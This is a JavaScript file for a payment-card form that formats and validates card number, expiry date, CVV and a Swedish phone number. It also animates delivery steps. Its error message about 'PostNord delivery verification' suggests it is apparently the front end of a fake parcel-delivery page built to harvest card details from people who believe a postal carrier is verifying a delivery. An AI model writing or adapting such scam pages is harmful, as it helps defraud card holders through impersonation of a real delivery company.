document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("cardForm")
  const cardNumberInput = document.getElementById("cardNumber")
  const expiryDateInput = document.getElementById("expiryDate")
  const cvvInput = document.getElementById("cvv")
  const cardTypeDiv = document.getElementById("cardType")
  const phoneInput = document.getElementById("phone")

  // Card type detection patterns
  const cardTypes = {
    visa: /^4[0-9]{12}(?:[0-9]{3})?$/,
    mastercard: /^5[1-5][0-9]{14}$/,
    amex: /^3[47][0-9]{13}$/,
    discover: /^6(?:011|5[0-9]{2})[0-9]{12}$/,
    diners: /^3[0689][0-9]{11}$/,
    jcb: /^(?:2131|1800|35\d{3})\d{11}$/,
  }

  // Luhn algorithm for card validation
  function luhnCheck(cardNumber) {
    const digits = cardNumber.replace(/\D/g, "").split("").map(Number)
    let sum = 0
    let isEven = false

    for (let i = digits.length - 1; i >= 0; i--) {
      let digit = digits[i]

      if (isEven) {
        digit *= 2
        if (digit > 9) {
          digit -= 9
        }
      }

      sum += digit
      isEven = !isEven
    }

    return sum % 10 === 0
  }

  // Detect card type
  function detectCardType(cardNumber) {
    const cleanNumber = cardNumber.replace(/\s/g, "")

    for (const [type, pattern] of Object.entries(cardTypes)) {
      if (pattern.test(cleanNumber)) {
        return type.toUpperCase()
      }
    }
    return ""
  }

  // Format card number with spaces
  cardNumberInput.addEventListener("input", (e) => {
    const value = e.target.value.replace(/\s/g, "").replace(/[^0-9]/gi, "")
    const formattedValue = value.match(/.{1,4}/g)?.join(" ") || value
    e.target.value = formattedValue

    // Detect and display card type
    const cardType = detectCardType(value)
    cardTypeDiv.textContent = cardType

    // Validate card number
    if (value.length >= 13) {
      if (luhnCheck(value)) {
        e.target.classList.remove("invalid")
        e.target.classList.add("valid")
      } else {
        e.target.classList.remove("valid")
        e.target.classList.add("invalid")
      }
    } else {
      e.target.classList.remove("valid", "invalid")
    }
  })

  // Format expiry date
  expiryDateInput.addEventListener("input", (e) => {
    let value = e.target.value.replace(/\D/g, "")
    if (value.length >= 2) {
      value = value.substring(0, 2) + "/" + value.substring(2, 4)
    }
    e.target.value = value

    // Validate expiry date
    if (value.length === 5) {
      const [month, year] = value.split("/")
      const currentDate = new Date()
      const currentYear = currentDate.getFullYear() % 100
      const currentMonth = currentDate.getMonth() + 1

      if (
        Number.parseInt(month) >= 1 &&
        Number.parseInt(month) <= 12 &&
        (Number.parseInt(year) > currentYear ||
          (Number.parseInt(year) === currentYear && Number.parseInt(month) >= currentMonth))
      ) {
        e.target.classList.remove("invalid")
        e.target.classList.add("valid")
      } else {
        e.target.classList.remove("valid")
        e.target.classList.add("invalid")
      }
    } else {
      e.target.classList.remove("valid", "invalid")
    }
  })

  // CVV validation
  cvvInput.addEventListener("input", (e) => {
    e.target.value = e.target.value.replace(/[^0-9]/g, "")

    if (e.target.value.length >= 3) {
      e.target.classList.remove("invalid")
      e.target.classList.add("valid")
    } else {
      e.target.classList.remove("valid", "invalid")
    }
  })

  // Phone number formatting (Swedish format)
  phoneInput.addEventListener("input", (e) => {
    let value = e.target.value.replace(/\D/g, "")

    // Swedish phone number formatting
    if (value.startsWith("46")) {
      value =
        "+" +
        value.substring(0, 2) +
        " " +
        value.substring(2, 4) +
        " " +
        value.substring(4, 7) +
        " " +
        value.substring(7, 11)
    } else if (value.startsWith("0")) {
      value = "+46 " + value.substring(1, 3) + " " + value.substring(3, 6) + " " + value.substring(6, 10)
    }

    e.target.value = value
  })

  // CVV help tooltip
  const cvvHelp = document.querySelector(".cvv-help")
  cvvHelp.addEventListener("click", () => {
    alert("CVV is the 3-digit security code on the back of your card (4 digits for American Express on the front)")
  })

  // Form validation
  form.addEventListener("submit", (e) => {
    let isValid = true

    // Remove previous error messages
    document.querySelectorAll(".error-message").forEach((msg) => msg.remove())

    // Validate card number
    const cardNumber = cardNumberInput.value.replace(/\s/g, "")
    if (!luhnCheck(cardNumber) || cardNumber.length < 13) {
      showError(cardNumberInput, "⚠️ Invalid card number for PostNord delivery verification")
      isValid = false
    }

    // Validate expiry date
    const expiryDate = expiryDateInput.value
    if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
      showError(expiryDateInput, "⚠️ Invalid expiry date format")
      isValid = false
    }

    // Validate CVV
    const cvv = cvvInput.value
    if (cvv.length < 3 || cvv.length > 4) {
      showError(cvvInput, "⚠️ Invalid CVV code")
      isValid = false
    }

    if (!isValid) {
      e.preventDefault()
    } else {
      // Show loading state
      const submitBtn = document.querySelector(".verify-btn")
      submitBtn.innerHTML = '<span class="btn-icon">⏳</span> Verifying Card...'
      submitBtn.disabled = true
    }
  })

  function showError(input, message) {
    input.classList.add("invalid")
    const errorDiv = document.createElement("div")
    errorDiv.className = "error-message"
    errorDiv.innerHTML = message
    input.parentNode.appendChild(errorDiv)
  }

  // Animate delivery steps
  setTimeout(() => {
    const steps = document.querySelectorAll(".step")
    steps.forEach((step, index) => {
      step.style.opacity = "0"
      step.style.transform = "translateX(-20px)"
      setTimeout(() => {
        step.style.transition = "all 0.5s ease"
        step.style.opacity = "1"
        step.style.transform = "translateX(0)"
      }, index * 200)
    })
  }, 500)
})
